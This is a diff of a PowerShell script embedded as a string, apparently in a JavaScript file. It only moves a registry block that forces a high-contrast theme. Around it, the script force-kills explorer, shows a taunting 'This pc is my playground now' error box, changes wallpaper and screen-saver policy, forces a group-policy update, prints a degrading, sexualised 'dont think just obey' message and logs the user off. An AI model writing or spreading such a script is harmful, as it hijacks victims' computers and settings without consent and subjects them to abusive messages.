@@ -167,14 +167,6 @@ Stop-Process -Name explorer -Force
 # Mostrar un mensaje aterrador en una ventana de mensaje
 [System.Windows.Forms.MessageBox]::Show("¡She won't help you this time. This pc is my playground now <3!", "Mal0 Warnign...", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
 
-# Cambiar al tema de alto contraste "Acuático"
-$themePath = "C:\\Windows\\Resources\\Ease of Access Themes\\hc1.theme"
-Set-ItemProperty -Path 'HKCU:\\Control Panel\\Desktop' -Name "ActiveWindowTracking" -Value 1
-Set-ItemProperty -Path 'HKCU:\\Control Panel\\Desktop' -Name "MenuShowDelay" -Value 0
-Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Themes\\Personalize' -Name "ThemeName" -Value "hc1"
-Start-Process $themePath
-
-
 # Ruta donde se guardará la imagen (accesible para todos los usuarios)
 $wallpaperPath = "C:\\Users\\Public\\Pictures\\wallpaper.jpg"
 
@@ -233,6 +225,13 @@ Set-ItemProperty -Path $policyControlPath -Name "ScreenSaveActive" -Value 1 -For
 Start-Process -FilePath "gpupdate.exe" -ArgumentList "/force" -Wait
 
 Write-Host "Why are you reading this ClickSlut, dont think just obey ~."
+
+# Cambiar al tema de alto contraste "Acuático"
+$themePath = "C:\\Windows\\Resources\\Ease of Access Themes\\hc1.theme"
+Set-ItemProperty -Path 'HKCU:\\Control Panel\\Desktop' -Name "ActiveWindowTracking" -Value 1
+Set-ItemProperty -Path 'HKCU:\\Control Panel\\Desktop' -Name "MenuShowDelay" -Value 0
+Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Themes\\Personalize' -Name "ThemeName" -Value "hc1"
+Start-Process $themePath
 
 shutdown.exe /l
 `;
